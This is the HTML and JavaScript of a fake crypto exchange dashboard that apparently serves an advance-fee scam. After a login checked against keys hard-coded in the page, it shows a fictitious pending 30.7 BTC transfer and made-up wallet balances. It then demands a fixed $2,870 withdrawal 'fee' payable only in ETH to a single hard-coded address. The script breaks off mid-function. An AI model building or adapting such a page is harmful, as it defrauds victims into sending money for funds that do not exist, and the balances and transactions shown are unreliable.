<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pro Crypto Exchange - VIP Dashboard</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        
        :root {
            --bg-dark: #0a192f;
            --bg-panel: #112240;
            --accent: #FF9800;
            --accent-hover: #F57C00;
            --text-main: #e6f1ff;
            --text-dim: #8892b0;
            --green: #00e676;
            --red: #f50057;
            --blue: #2196f3;
            --border: #1e2a47;
        }

        body { background-color: var(--bg-dark); color: var(--text-main); height: 100vh; display: flex; overflow: hidden; }

        /* --- Login Overlay --- */
        .login-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: var(--bg-dark); z-index: 1000;
            display: flex; justify-content: center; align-items: center;
        }
        .login-box {
            background: var(--bg-panel); padding: 40px; width: 400px;
            border-radius: 10px; border: 1px solid var(--border);
            box-shadow: 0 20px 50px rgba(0,0,0,0.5); text-align: center;
        }
        .login-logo { font-size: 40px; color: var(--accent); margin-bottom: 20px; }
        .login-input {
            width: 100%; padding: 12px; margin-bottom: 15px;
            background: var(--bg-dark); border: 1px solid var(--border);
            color: white; border-radius: 5px; outline: none;
        }
        .login-input:focus { border-color: var(--accent); }
        .login-btn {
            width: 100%; padding: 12px; background: var(--accent);
            color: white; font-weight: bold; border: none; border-radius: 5px;
            cursor: pointer; font-size: 16px;
        }
        .error-msg { color: var(--red); font-size: 13px; margin-top: 10px; display: none; }

        /* --- Main Layout --- */
        .sidebar {
            width: 240px; background: var(--bg-panel); border-right: 1px solid var(--border);
            display: flex; flex-direction: column; padding: 20px 0;
        }
        .logo-area { padding: 0 20px 30px; display: flex; align-items: center; gap: 10px; font-size: 20px; font-weight: bold; color: var(--accent); }
        .nav-item {
            padding: 15px 25px; cursor: pointer; color: var(--text-dim);
            display: flex; align-items: center; gap: 12px; transition: 0.2s;
        }
        .nav-item:hover, .nav-item.active { background: rgba(255, 152, 0, 0.1); color: var(--accent); border-right: 3px solid var(--accent); }
        
        .main-content { flex: 1; display: flex; flex-direction: column; overflow: hidden; }
        
        /* Header */
        .top-bar {
            height: 70px; border-bottom: 1px solid var(--border);
            display: flex; justify-content: space-between; align-items: center;
            padding: 0 30px; background: var(--bg-panel);
        }
        .action-btns { display: flex; gap: 15px; }
        .action-btn {
            padding: 8px 20px; border-radius: 5px; font-weight: 600; cursor: pointer; font-size: 14px; border: none;
            transition: transform 0.2s;
        }
        .action-btn:hover { transform: translateY(-2px); }
        .btn-deposit { background: var(--green); color: #000; }
        .btn-withdraw { background: var(--bg-dark); color: var(--text-main); border: 1px solid var(--text-dim); }
        .user-profile { display: flex; align-items: center; gap: 10px; font-size: 14px; }
        .user-id-badge { background: #000; padding: 4px 8px; border-radius: 4px; font-family: monospace; color: var(--accent); }

        /* Dashboard Content */
        .content-area { flex: 1; overflow-y: auto; padding: 30px; }
        .section-title { font-size: 22px; margin-bottom: 20px; font-weight: 500; }

        /* Cards */
        .grid-container { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; }
        .card { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 8px; padding: 25px; margin-bottom: 20px; }
        
        /* Specific Transaction Card */
        .tx-card { border-left: 5px solid var(--accent); position: relative; overflow: hidden; }
        .tx-card::after {
            content: ''; position: absolute; top: 0; right: 0; width: 100px; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,152,0,0.05));
        }
        .tx-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
        .tx-status { background: rgba(255,152,0,0.2); color: var(--accent); padding: 5px 12px; border-radius: 15px; font-size: 12px; font-weight: bold; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { opacity: 0.7; } 50% { opacity: 1; } 100% { opacity: 0.7; } }

        .tx-details-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 15px; }
        .detail-item label { display: block; font-size: 12px; color: var(--text-dim); margin-bottom: 4px; }
        .detail-item div { font-family: monospace; font-size: 14px; color: white; word-break: break-all; }
        .server-tag { color: var(--green) !important; font-weight: bold; font-family: 'Segoe UI', sans-serif !important; }

        .big-amount { font-size: 42px; color: white; font-weight: 700; margin: 10px 0; }
        .sub-amount { color: var(--text-dim); font-size: 18px; }

        /* Trading & Bots Section */
        .market-row { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 14px; }
        .buy-sell-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 20px; }
        .trade-btn { padding: 12px; border: none; border-radius: 4px; color: white; font-weight: bold; cursor: pointer; transition: opacity 0.2s; }
        .trade-btn:hover { opacity: 0.9; }
        .btn-buy { background: var(--green); }
        .btn-sell { background: var(--red); }

        .bot-item { display: flex; justify-content: space-between; align-items: center; padding: 15px; background: var(--bg-dark); border-radius: 5px; margin-bottom: 10px; }
        .bot-status-off { color: var(--red); font-size: 12px; }

        /* Wallet Table */
        .wallet-table { width: 100%; border-collapse: collapse; }
        .wallet-table th { text-align: left; padding: 12px; color: var(--text-dim); border-bottom: 1px solid var(--border); font-size: 14px; }
        .wallet-table td { padding: 15px 12px; border-bottom: 1px solid var(--border); font-family: monospace; }
        .wallet-table tr:hover { background: rgba(255,255,255,0.02); }

        /* Deposit/Withdraw Modals */
        .modal-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.8); z-index: 2000;
            display: flex; justify-content: center; align-items: center;
            display: none;
        }
        .modal-box {
            background: var(--bg-panel); width: 500px; max-width: 90%;
            border-radius: 10px; border: 1px solid var(--border);
            padding: 30px; position: relative;
        }
        .close-modal {
            position: absolute; top: 15px; right: 15px;
            background: none; border: none; color: var(--text-dim);
            font-size: 20px; cursor: pointer;
        }
        .modal-title { font-size: 22px; margin-bottom: 20px; color: var(--accent); }
        .coin-grid {
            display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px;
            margin: 20px 0;
        }
        .coin-item {
            background: var(--bg-dark); border: 1px solid var(--border);
            border-radius: 5px; padding: 15px; text-align: center;
            cursor: pointer; transition: 0.2s;
        }
        .coin-item:hover { border-color: var(--accent); }
        .coin-item.selected { border-color: var(--accent); background: rgba(255,152,0,0.1); }
        .coin-icon { font-size: 30px; margin-bottom: 10px; }
        .eth-icon { color: #627eea; }
        .btc-icon { color: #f7931a; }
        .usdt-icon { color: #26a17b; }
        .bnb-icon { color: #f0b90b; }
        
        .address-box {
            background: var(--bg-dark); border: 1px solid var(--border);
            border-radius: 5px; padding: 15px; margin: 15px 0;
            font-family: monospace; word-break: break-all;
            display: flex; justify-content: space-between; align-items: center;
        }
        .copy-btn {
            background: var(--accent); color: white; border: none;
            padding: 5px 10px; border-radius: 3px; cursor: pointer;
            font-size: 12px;
        }
        .qr-code {
            width: 150px; height: 150px; background: white;
            margin: 20px auto; padding: 10px; border-radius: 5px;
            display: flex; align-items: center; justify-content: center;
            color: black; font-weight: bold;
        }
        .fee-notice {
            background: rgba(255, 152, 0, 0.1); border-left: 3px solid var(--accent);
            padding: 15px; margin: 20px 0; border-radius: 3px;
        }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; color: var(--text-dim); }
        .form-select {
            width: 100%; padding: 12px; background: var(--bg-dark);
            border: 1px solid var(--border); color: white; border-radius: 5px;
        }
        .balance-info { color: var(--text-dim); font-size: 14px; margin-top: 5px; }
        .eth-fee-box {
            background: rgba(98, 126, 234, 0.1); border: 1px solid #627eea;
            padding: 15px; border-radius: 5px; margin: 15px 0;
        }

        /* Hidden tabs logic */
        .tab-content { display: none; }
        .tab-content.active { display: block; }

    </style>
</head>
<body>

    <div class="login-overlay" id="loginScreen">
        <div class="login-box">
            <div class="login-logo"><i class="fab fa-bitcoin"></i></div>
            <h2 style="margin-bottom: 10px;">Platform Access</h2>
            <p style="color: var(--text-dim); margin-bottom: 25px; font-size: 14px;">Secure Gateway Node</p>
            
            <input type="text" id="accessKey" class="login-input" placeholder="Access Key">
            <input type="password" id="secretKey" class="login-input" placeholder="Secret Key">
            
            <button class="login-btn" onclick="authenticate()">CONNECT</button>
            <div class="error-msg" id="loginError">Invalid Credentials. Connection Refused.</div>
        </div>
    </div>

    <!-- Deposit Modal -->
    <div class="modal-overlay" id="depositModal">
        <div class="modal-box">
            <button class="close-modal" onclick="closeModal('depositModal')">×</button>
            <h2 class="modal-title"><i class="fas fa-arrow-down"></i> Deposit Assets</h2>
            
            <div class="coin-grid" id="depositCoins">
                <div class="coin-item selected" data-coin="ETH" onclick="selectDepositCoin('ETH')">
                    <div class="coin-icon eth-icon"><i class="fab fa-ethereum"></i></div>
                    <div>Ethereum (ETH)</div>
                </div>
                <div class="coin-item" data-coin="BTC" onclick="selectDepositCoin('BTC')">
                    <div class="coin-icon btc-icon"><i class="fab fa-bitcoin"></i></div>
                    <div>Bitcoin (BTC)</div>
                </div>
                <div class="coin-item" data-coin="USDT" onclick="selectDepositCoin('USDT')">
                    <div class="coin-icon usdt-icon"><i class="fas fa-coins"></i></div>
                    <div>Tether (USDT)</div>
                </div>
                <div class="coin-item" data-coin="BNB" onclick="selectDepositCoin('BNB')">
                    <div class="coin-icon bnb-icon"><i class="fab fa-btc"></i></div>
                    <div>BNB (BNB)</div>
                </div>
            </div>

            <div id="ethDepositInfo">
                <h3 style="margin: 20px 0 10px;">Ethereum Deposit Address</h3>
                <div class="address-box">
                    <span id="ethAddress">0x2f87CDfC02E17E7A82D048405DF41554811a9f96</span>
                    <button class="copy-btn" onclick="copyToClipboard('ethAddress')">
                        <i class="fas fa-copy"></i> Copy
                    </button>
                </div>
                
                <div class="qr-code">
                    ETH<br>QR Code
                </div>
                
                <div class="fee-notice">
                    <strong><i class="fas fa-exclamation-triangle"></i> Important:</strong>
                    <p style="margin-top: 5px;">Send only Ethereum (ETH) to this address. Sending other tokens may result in permanent loss.</p>
                    <p style="margin-top: 5px; color: var(--green);">Network: Ethereum ERC20</p>
                </div>
            </div>

            <div id="btcDepositInfo" style="display: none;">
                <!-- Similar structure for BTC -->
                <h3 style="margin: 20px 0 10px;">Bitcoin Deposit Address</h3>
                <div class="address-box">
                    <span>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</span>
                    <button class="copy-btn"><i class="fas fa-copy"></i> Copy</button>
                </div>
            </div>
        </div>
    </div>

    <!-- Withdraw Modal -->
    <div class="modal-overlay" id="withdrawModal">
        <div class="modal-box">
            <button class="close-modal" onclick="closeModal('withdrawModal')">×</button>
            <h2 class="modal-title"><i class="fas fa-arrow-up"></i> Withdraw Assets</h2>
            
            <div class="form-group">
                <label for="withdrawCoin">Select Coin</label>
                <select id="withdrawCoin" class="form-select" onchange="updateWithdrawInfo()">
                    <option value="BTC">Bitcoin (BTC)</option>
                    <option value="ETH">Ethereum (ETH)</option>
                    <option value="USDT">Tether (USDT)</option>
                    <option value="BNB">BNB (BNB)</option>
                </select>
            </div>

            <div class="form-group">
                <label for="withdrawAddress">Withdrawal Address</label>
                <input type="text" id="withdrawAddress" class="login-input" placeholder="Enter destination address">
            </div>

            <div class="form-group">
                <label for="withdrawAmount">Amount</label>
                <input type="number" id="withdrawAmount" class="login-input" placeholder="0.00" step="0.000001">
                <div class="balance-info">
                    Available: <span id="availableBalance">7.10041804 BTC</span>
                    <button style="margin-left: 10px; padding: 2px 8px; background: var(--border); border: none; color: white; border-radius: 3px; font-size: 12px;" onclick="setMaxAmount()">MAX</button>
                </div>
            </div>

            <div class="form-group">
                <label for="network">Network</label>
                <select id="network" class="form-select">
                    <option value="ERC20">Ethereum ERC20</option>
                    <option value="BEP20">BNB Smart Chain BEP20</option>
                    <option value="TRC20">Tron TRC20</option>
                </select>
            </div>

            <div class="eth-fee-box">
                <h4 style="color: #627eea; margin-bottom: 10px;">
                    <i class="fab fa-ethereum"></i> Platform Withdrawal Fee
                </h4>
                <div style="font-size: 18px; font-weight: bold;">
                    $2,870.00 USD
                </div>
                <div id="ethFeeAmount" style="margin-top: 5px;">
                    ≈ 1.00000000 ETH
                </div>
                <p style="margin-top: 10px; font-size: 12px; color: var(--text-dim);">
                    This fee must be paid in ETH and will be deducted from your Ethereum balance.
                    Current ETH price: <span id="currentEthPrice">$2,870.00</span>
                </p>
            </div>

            <div class="fee-notice" id="ethBalanceWarning" style="display: none; background: rgba(245, 0, 87, 0.1); border-left-color: var(--red);">
                <strong><i class="fas fa-exclamation-circle"></i> Insufficient ETH Balance</strong>
                <p style="margin-top: 5px;">You need <span id="requiredEth">1.00000000 ETH</span> ($2,870.00) for the withdrawal fee. Please deposit ETH first.</p>
            </div>

            <div style="margin-top: 25px;">
                <button class="login-btn" onclick="processWithdrawal()" style="background: var(--accent);">
                    <i class="fas fa-paper-plane"></i> PROCESS WITHDRAWAL
                </button>
            </div>

            <div class="eth-address-box" style="margin-top: 20px; padding: 15px; background: var(--bg-dark); border-radius: 5px; border: 1px solid var(--border);">
                <p style="color: var(--text-dim); margin-bottom: 10px;">
                    <i class="fas fa-info-circle"></i> Ethereum Address for Fee Payment
                </p>
                <div style="font-family: monospace; word-break: break-all; color: var(--accent);">
                    0x2f87CDfC02E17E7A82D048405DF41554811a9f96
                </div>
                <p style="font-size: 12px; margin-top: 10px; color: var(--text-dim);">
                    Deposit ETH to this address before withdrawing. The fee will be automatically deducted.
                </p>
            </div>
        </div>
    </div>

    <div class="main-content" id="appInterface" style="display: none; flex-direction: row;">
        
        <div class="sidebar">
            <div class="logo-area"><i class="fab fa-bitcoin"></i> CryptoDesk</div>
            <div class="nav-item active" onclick="switchTab('dashboard', this)"><i class="fas fa-th-large"></i> Dashboard</div>
            <div class="nav-item" onclick="switchTab('trading', this)"><i class="fas fa-chart-line"></i> Spot Trading</div>
            <div class="nav-item" onclick="switchTab('bots', this)"><i class="fas fa-robot"></i> Algo Bots</div>
            <div class="nav-item" onclick="switchTab('wallet', this)"><i class="fas fa-wallet"></i> My Wallet</div>
            <div style="margin-top: auto; padding: 20px;">
                <div style="font-size: 12px; color: var(--text-dim);">Server Time</div>
                <div id="serverTime" style="font-family: monospace;">00:00:00</div>
            </div>
        </div>

        <div class="main-content">
            <div class="top-bar">
                <div style="font-weight: 600; font-size: 18px;" id="pageTitle">Dashboard Overview</div>
                <div style="display: flex; gap: 20px; align-items: center;">
                    <div class="action-btns">
                        <button class="action-btn btn-deposit" onclick="openDepositModal()">
                            <i class="fas fa-arrow-down"></i> Deposit
                        </button>
                        <button class="action-btn btn-withdraw" onclick="openWithdrawModal()">
                            <i class="fas fa-arrow-up"></i> Withdraw
                        </button>
                    </div>
                    <div class="user-profile">
                        <span>Status: <span style="color: var(--green);">Online</span></span>
                        <div class="user-id-badge">ID: 884-21</div>
                        <button onclick="location.reload()" style="background: none; border: none; color: var(--red); cursor: pointer;"><i class="fas fa-power-off"></i></button>
                    </div>
                </div>
            </div>

            <div class="content-area tab-content active" id="dashboard">
                
                <div class="card tx-card" style="margin-bottom: 25px;">
                    <div class="tx-header">
                        <div style="display: flex; align-items: center; gap: 10px;">
                            <i class="fas fa-bell" style="color: var(--accent); font-size: 20px;"></i>
                            <span style="font-size: 18px; font-weight: 600;">Incoming Transaction Detected</span>
                        </div>
                        <div class="tx-status">PENDING CONFIRMATION</div>
                    </div>
                    
                    <div style="display: flex; justify-content: space-between; align-items: flex-end;">
                        <div>
                            <div class="big-amount">30.70070032 BTC</div>
                            <div class="sub-amount" id="usdEquivalent">Loading Value...</div>
                        </div>
                        <div style="text-align: right; color: var(--text-dim); font-size: 13px;">
                            <i class="fas fa-clock"></i> First seen: <span id="timeElapsed">411 mins ago</span>
                        </div>
                    </div>

                    <div style="margin: 20px 0; border-top: 1px solid var(--border);"></div>

                    <div class="tx-details-grid">
                        <div class="detail-item">
                            <label>SENDER (SOURCE)</label>
                            <div class="server-tag"><i class="fas fa-server"></i> SERVER NODE [54858455222547]</div>
                        </div>
                        <div class="detail-item">
                            <label>PROTOCOL</label>
                            <div>STRATUM+TCP // MINING POOL</div>
                        </div>
                        <div class="detail-item">
                            <label>DESTINATION (BATCH)</label>
                            <div style="color: var(--accent);">Multi-Sig Distribution (4 Wallets)</div>
                        </div>
                        <div class="detail-item">
                            <label>NETWORK FEE</label>
                            <div>0.00045000 BTC (High Priority)</div>
                        </div>
                    </div>
                </div>

                <div class="grid-container">
                    <div class="card">
                        <h3 class="section-title">Bitcoin Market (Real-Time)</h3>
                        <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 20px;">
                            <div style="font-size: 32px; font-weight: bold;" id="btcPrice">$--,---.--</div>
                            <div style="font-size: 18px; color: var(--green);" id="btcChange">+0.00%</div>
                        </div>
                        <div style="height: 150px; background: rgba(0,0,0,0.2); border-radius: 4px; display: flex; align-items: center; justify-content: center; color: var(--text-dim);">
                            [Secure Chart API Connected]
                        </div>
                    </div>

                    <div class="card">
                        <h3 class="section-title">Active Bots</h3>
                        <div style="text-align: center; color: var(--text-dim); padding: 20px;">
                            <i class="fas fa-robot" style="font-size: 40px; margin-bottom: 10px; color: var(--border);"></i>
                            <p>No active bots running on this node.</p>
                            <button style="margin-top: 15px; padding: 8px 15px; background: var(--border); color: white; border: none; border-radius: 4px; cursor: pointer;">Configure Bots</button>
                        </div>
                    </div>
                </div>
            </div>

            <div class="content-area tab-content" id="trading">
                <h2 class="section-title">Pro Spot Trading</h2>
                <div class="grid-container">
                    <div class="card">
                        <div class="market-row"><span>Available Balance:</span> <span>0.00000000 BTC</span></div>
                        <div class="market-row"><span>Pending Balance:</span> <span style="color: var(--accent);">30.70070032 BTC</span></div>
                        
                        <div style="margin-top: 20px;">
                            <label style="display: block; margin-bottom: 5px; color: var(--text-dim);">Price (USDT)</label>
                            <input type="text" id="tradePrice" class="login-input" readonly>
                            
                            <label style="display: block; margin-bottom: 5px; color: var(--text-dim); margin-top: 10px;">Amount (BTC)</label>
                            <input type="text" class="login-input" placeholder="0.00">
                        </div>

                        <div class="buy-sell-btns">
                            <button class="trade-btn btn-buy">BUY</button>
                            <button class="trade-btn btn-sell">SELL</button>
                        </div>
                    </div>
                    <div class="card">
                        <h4>Order Book</h4>
                        <div style="margin-top: 15px; font-size: 12px; font-family: monospace;">
                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,520.10</span> <span>0.523</span></div>
                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,519.80</span> <span>1.200</span></div>
                            <div style="color: var(--red); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,519.50</span> <span>0.050</span></div>
                            <hr style="border-color: var(--border); margin: 10px 0;">
                            <div style="color: var(--green); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,518.00</span> <span>2.100</span></div>
                            <div style="color: var(--green); display: flex; justify-content: space-between; margin-bottom: 5px;"><span>48,517.50</span> <span>0.850</span></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="content-area tab-content" id="bots">
                <h2 class="section-title">Algorithmic Trading Bots</h2>
                <div class="card">
                    <div class="bot-item">
                        <div>
                            <div style="font-weight: bold;">Grid Trader AI</div>
                            <div style="font-size: 12px; color: var(--text-dim);">High Frequency / Low Risk</div>
                        </div>
                        <button class="action-btn" style="background: var(--bg-dark); color: white;">Start</button>
                    </div>
                    <div class="bot-item">
                        <div>
                            <div style="font-weight: bold;">Arbitrage Scanner</div>
                            <div style="font-size: 12px; color: var(--text-dim);">Multi-Exchange Difference</div>
                        </div>
                        <button class="action-btn" style="background: var(--bg-dark); color: white;">Start</button>
                    </div>
                    <div class="bot-item">
                        <div>
                            <div style="font-weight: bold;">Auto-Withdraw Bot</div>
                            <div style="font-size: 12px; color: var(--text-dim);">Automated Asset Movement</div>
                        </div>
                        <button class="action-btn" style="background: var(--bg-dark); color: white;">Config</button>
                    </div>
                </div>
            </div>

            <div class="content-area tab-content" id="wallet">
                <h2 class="section-title">Wallet Balances</h2>
                <div class="card">
                    <table class="wallet-table">
                        <thead>
                            <tr>
                                <th>Address / Wallet</th>
                                <th>Label</th>
                                <th>Balance (BTC)</th>
                                <th>ETH Balance</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr>
                                <td style="color: var(--accent);">1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU</td>
                                <td>Primary Vault</td>
                                <td style="font-weight: bold; color: white;">7.10041804</td>
                                <td style="color: #627eea; font-weight: bold;">0.50000000</td>
                                <td style="color: var(--green);">Active</td>
                            </tr>
                            <tr>
                                <td>1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR</td>
                                <td>Secondary</td>
                                <td style="font-weight: bold; color: white;">7.20014379</td>
                                <td style="color: #627eea; font-weight: bold;">0.00000000</td>
                                <td style="color: var(--green);">Active</td>
                            </tr>
                            <tr>
                                <td>12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4</td>
                                <td>Cold Storage</td>
                                <td style="font-weight: bold; color: white;">7.30013849</td>
                                <td style="color: #627eea; font-weight: bold;">2.10000000</td>
                                <td style="color: var(--green);">Active</td>
                            </tr>
                            <tr>
                                <td>1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74</td>
                                <td>Legacy Wallet</td>
                                <td style="font-weight: bold; color: white;">9.10000000</td>
                                <td style="color: #627eea; font-weight: bold;">0.80000000</td>
                                <td style="color: var(--green);">Active</td>
                            </tr>
                            <tr style="background: rgba(255, 152, 0, 0.1);">
                                <td colspan="2" style="text-align: right; color: var(--text-dim); font-weight: bold;">TOTAL PENDING:</td>
                                <td style="color: var(--accent); font-weight: bold; font-size: 16px;">30.70070032</td>
                                <td style="color: #627eea; font-weight: bold; font-size: 16px;">3.40000000</td>
                                <td></td>
                            </tr>
                        </tbody>
                    </table>
                </div>
                
                <div class="card">
                    <h3 class="section-title">Platform Fee Information</h3>
                    <div style="display: flex; align-items: center; gap: 20px; margin-bottom: 15px;">
                        <div style="background: rgba(98, 126, 234, 0.1); padding: 15px; border-radius: 8px; flex: 1;">
                            <div style="font-size: 12px; color: var(--text-dim);">Withdrawal Fee</div>
                            <div style="font-size: 24px; font-weight: bold; color: #627eea;">$2,870.00</div>
                            <div style="font-size: 14px; color: var(--text-dim);">Fixed fee for all withdrawals</div>
                        </div>
                        <div style="background: rgba(255, 152, 0, 0.1); padding: 15px; border-radius: 8px; flex: 1;">
                            <div style="font-size: 12px; color: var(--text-dim);">Payable in</div>
                            <div style="font-size: 24px; font-weight: bold; color: var(--accent);">ETH only</div>
                            <div style="font-size: 14px; color: var(--text-dim);">Platform currency</div>
                        </div>
                    </div>
                    
                    <div class="eth-address-box" style="padding: 15px; background: var(--bg-dark); border-radius: 5px; border: 1px solid #627eea; margin-top: 15px;">
                        <p style="color: #627eea; margin-bottom: 10px; font-weight: bold;">
                            <i class="fab fa-ethereum"></i> ETH Fee Deposit Address
                        </p>
                        <div style="font-family: monospace; word-break: break-all; color: white; margin-bottom: 10px;">
                            0x2f87CDfC02E17E7A82D048405DF41554811a9f96
                        </div>
                        <button class="copy-btn" onclick="copyToClipboard('ethAddress2')" style="background: #627eea;">
                            <i class="fas fa-copy"></i> Copy Address
                        </button>
                    </div>
                </div>
            </div>

        </div>
    </div>

    <script>
        // CONFIGURATION
        const CONFIG = {
            key: "554$$@@#3$#$!!#@@!44234",
            secret: "000000000000000000000000000000000000000006D9EC10A2B21AD9AE7750DD",
            btcAmount: 30.70070032,
            ethPrice: 2870.00, // Fixed ETH price for fee calculation
            withdrawalFeeUSD: 2870.00,
            ethAddress: "0x2f87CDfC02E17E7A82D048405DF41554811a9f96"
        };

        // User wallet balances
        const USER_BALANCES = {
            BTC: {
                total: 30.70070032,
                available: 7.10041804,
                wallets: [
                    { address: "1PWo3JeB9jrGwfHDNpdGK54CRas7fsVzXU", balance: 7.10041804, label: "Primary Vault" },
                    { address: "1JTK7s9YVYywfm5XUH7RNhHJH1LshCaRFR", balance: 7.20014379, label: "Secondary" },
                    { address: "12VVRNPi4SJqUTsp6FmqDqY5sGosDtysn4", balance: 7.30013849, label: "Cold Storage" },
                    { address: "1EzVHtmbN4fs4MiNk3ppEnKKhsmXYJ4s74", balance: 9.10000000, label: "Legacy Wallet" }
                ]
            },
            ETH: {
                total: 3.40000000,
                wallets: [
                    { address: CONFIG.ethAddress, balance: 0.50000000 },
                    { address: "0x...", balance: 0.00000000 },
                    { address: "0x...", balance: 2.10000000 },
                    { address: "0x...", balance: 0.80000000 }
                ]
            }
        };

        // AUTHENTICATION
        function authenticate() {
            const k = document.getElementById('accessKey').value.trim();
            const s = document.getElementById('secretKey').value.trim();
            
            if(k === CONFIG.key && s === CONFIG.secret) {
                document.getElementById('loginScreen').style.display = 'none';
                document.getElementById('appInterface').style.display = 'flex';
                initApp();
            } else {
                document.getElementById('loginError').style.display = 'block';
            }
        }

        // APP INITIALIZATION
        function initApp() {
            fetchMarketData();
            startTimer();
            setInterval(fetchMarketData, 5000);
            
            // Server Clock
            setInterval(() => {
                const now = new Date();
                document.getElementById('serverTime').innerText = now.toISOString().split('T')[1].split('.')[0];
            }, 1000);
            
            // Initialize ETH fee calculation
            updateEthFee();
        }

        // BINANCE API
        async function fetchMarketData() {
            try {
                const res = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=BTCUSDT');
                const data = await res.json();
                
                const price = parseFloat(data.lastPrice);
                const change = parseFloat(data.priceChangePercent);
                
                // Update UI Elements
                const formattedPrice = `$${price.toLocaleString('en-US', {minimumFractionDigits: 2})}`;
                
                document.getElementById('btcPrice').innerText = formattedPrice;
                document.getElementById('tradePrice').value = price.toFixed(2);
                
                const changeEl = document.getElementById('btcChange');
                changeEl.innerText = `${change > 0 ? '+' : ''}${change.toFixed(2)}%`;
                changeEl.style.color = change >= 0 ? 'var(--green)' : 'var(--red)';

                // Update Transaction USD Value
                const totalUsd = price * CONFIG.btcAmount;
                document.getElementById('usdEquivalent').innerText = `≈ $${totalUsd.toLocaleString('en-US', {minimumFractionDigits: 2})}`;

                // Also fetch ETH price
                const ethRes = await fetch('https://api.binance.com/api/v3/ticker/24hr?symbol=ETHUSDT');
                const ethData = await ethRes.json();
                CONFIG.ethPrice = parseFloat(ethData.lastPrice);
                updateEthFee();

            } catch(e) {
                console.log("Connection Error");
                // Use fallback data
                document.getElementById('currentEthPrice').innerText = `$${CONFIG.ethPrice.toFixed(2)}`;
            }
        }

        // TAB SWITCHING
        window.switchTab = function(tabId, element) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
            // Show target
            document.getElementById(tabId).classList.add('active');
            
            // Update sidebar active state
            document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
            element.classList.add('active');

            // Update Title
            const titles = {
                'dashboard': 'Dashboard Overview',
                'trading': 'Spot Trading Terminal',
                'bots': 'Algorithmic Bots Configuration',
                'wallet': 'Wallet Funds & Assets'
            };
            document.getElementById('pageTitle').innerText = titles[tabId];
        }

        // MODAL FUNCTIONS
        function openDepositModal() {
            document.getElementById('depositModal').style.display = 'flex';
        }

        function openWithdrawModal() {
            document.getElementById('withdrawModal').style.display = 'flex';
            updateWithdrawInfo();
        }

        function closeModal(modalId) {
            document.getElementById(modalId).style.display = 'none';
        }

        function selectDepositCoin(coin) {
            // Update coin selection UI
            document.querySelectorAll('.coin-item').forEach(item => {
                item.classList.remove('selected');
            });
            event.target.closest('.coin-item').classList.add('selected');
            
            // Show corresponding deposit info
            document.querySelectorAll('[id$="DepositInfo"]').forEach(el => {
                el.style.display = 'none';
            });
            document.getElementById(`${coin.toLowerCase()}DepositInfo`).style.display = 'block';
        }

        // ETH FEE CALCULATION
        function updateEthFee() {
            const ethRequired = CONFIG.withdrawalFeeUSD / CONFIG.ethPrice;
            document.getElementById('ethFeeAmount').innerText = `≈ ${ethRequired.toFixed(8)} ETH`;
            document.getElementById('requiredEth').innerText = `${ethRequired.toFixed(8)} ETH`;
            document.getElementById('currentEthPrice').innerText = `$${CONFIG.ethPrice.toFixed(2)}`;
            
            // Check if user has enough ETH
            const hasEnoughETH = USER_BALANCES.ETH.total >= ethRequired;
            document.getElementById('ethBalanceWarning').style.display = hasEnoughETH ? 'none' : 'block';
        }

        // WITHDRAWAL FUNCTIONS
        function updateWithdrawInfo() {
            const coin = document.getElementById('withdrawCoin').value;
            const balance = USER_BALANCES[coin] ? USER_BALANCES[coin].available : 0;
            document.getElementById('availableBalance').innerText = `${balance} ${coin}`;
            document.getElementById('availableBalance').style.color = coin === 'ETH' ? '#627eea' : 'white';
        }

        function setMaxAmount() {
            const coin = document.getElementById('withdrawCoin').value;
            const balance = USER_BALANCES[coin] ? USER_BALANCES[coin].available : 0;
            document.getElementById('withdrawAmount').value = balance;
        }

        function processWithdrawal() {
            const coin = document.getElementById('withdrawCoin').value;
            const amount = parseFloat(document.getElementById('withdrawAmount').value);
            const address = document.getElementById('withdrawAddress').value.trim();
            
            if (!address) {
                alert("Please enter a withdrawal address");
                return;
            }
            
            if (!amount || amount <= 0) {
                alert("Please enter a valid amount");
                return;
            }
            
            const balance = USER_BALANCES[coin] ? USER_BALANCES[coin].available : 0;
            if (amount > balance) {
                alert(`Insufficient ${coin} balance. Available: ${balance} ${coin}`);
                return;
            }
            
            // Calculate ETH fee
            const ethRequired = CONFIG.withdrawalFeeUSD / CONFIG.ethPrice;
            if (USER_BALANCES.ETH.total < ethRequired) {
                alert(`Insufficient ETH for withdrawal fee. You need ${ethRequired.toFixed(8)} ETH ($${CONFIG.withdrawalFeeUSD.toFixed(2)})`);
                return;
            }
            
            // Confirmation
            const confirmation = confirm(
